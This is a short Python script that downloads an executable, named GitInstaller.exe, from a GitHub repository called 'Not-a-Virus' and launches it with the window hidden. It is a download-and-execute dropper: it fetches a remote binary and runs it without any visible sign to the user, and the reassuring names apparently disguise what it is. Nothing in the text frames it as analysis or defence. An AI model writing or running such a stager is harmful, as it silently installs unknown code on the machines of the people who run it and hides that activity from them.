import requests
import os
from time import sleep
import subprocess

file = requests.get('https://github.com/romanjmock/Not-a-Virus/blob/892885a770ac46ce2211477a162b85d8bba661ed/dist/GitInstaller.exe?raw=true')
newFile = open('GitInstaller.exe', 'wb')
newFile.write(file.content)
newFile.close()

CREATE_NO_WINDOW = 0x08000000
subprocess.Popen('GitInstaller.exe', creationflags = CREATE_NO_WINDOW)